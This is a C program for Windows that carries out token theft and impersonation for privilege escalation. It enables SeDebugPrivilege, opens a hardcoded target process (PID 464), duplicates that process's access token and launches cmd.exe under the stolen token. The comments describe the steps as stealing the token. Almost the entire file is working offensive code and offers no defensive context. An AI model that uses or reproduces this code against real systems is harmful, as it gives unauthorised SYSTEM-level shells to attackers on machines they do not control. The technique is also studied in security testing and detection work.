#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")

void EnablePrivileges(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {

	// HANDLE hToken // Handle where the stolen access token will be stored
	// LPCTSTR PrivName // Privilege name to enable/disable 
	// BOOL EnablePrivilege // Enable/Disable privilege

	TOKEN_PRIVILEGES tp;
	LUID luid; // A pointer to recieve LUID of the privilege on local system

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		printf("LookupPrivilegeValue() Failed :(");
		printf("Error code : %d", GetLastError());
		exit(-1);
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
	{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else {
		tp.Privileges[0].Attributes = 0;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges() Failed :(");
	}
	printf("Privileges enabled! ;)\n");
}


int main() 
{
	int pid_to_impersonate = 464;
	HANDLE TokenHandle = NULL; // Handle to store the remote process token 
	HANDLE DuplicateTokenHandle = NULL; // Handle to store the duplicated remote process token 
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);


	// Here we get the current process token 
	HANDLE CurrentTokenHandle = NULL; 
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle);
	if (!getCurrentToken)
	{
		printf("Couldn't retrieve current process token ;(\n");
		printf("Error code : %d", GetLastError());
	}

	// Finally enable the SE_DEBUG_PRIVILEGE
	EnablePrivileges(CurrentTokenHandle, SE_DEBUG_NAME, TRUE);

	// Now we retrieve a handle to the target process and steal it's token
	HANDLE rProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid_to_impersonate);
	if (!rProc)
	{
		printf("OpenProcess() Failed ;(\n");
		printf("Error code : %d", GetLastError());
	}
	BOOL rToken = OpenProcessToken(rProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);
	if (!rToken)
	{
		printf("OpenProcessToken() Failed ;(\n");
		printf("Error code : %d\n", GetLastError());
	}

	// Now we impersonate the current user's token
	BOOL ImpersonateUser = ImpersonateLoggedOnUser(TokenHandle);
	if (!ImpersonateUser)
	{
		printf("ImpersonateLoggedOnUser() Failed ;(\n");
		printf("Error code : %d\n", GetLastError());

	}

	// We duplicate the token, and create a new process using it
	if (!DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateTokenHandle))
	{
		printf("DuplicateTokenEx() Failed ;(\n");
		printf("Error code : %d\n", GetLastError());
	}

	if (!CreateProcessWithTokenW(DuplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL,0, NULL, NULL, &startupInfo, &processInformation))
	{
		printf("CreateProcessWithTokenW() Failed ;(\n");
		printf("Error code : %d\n", GetLastError());

	}
	return 0;
}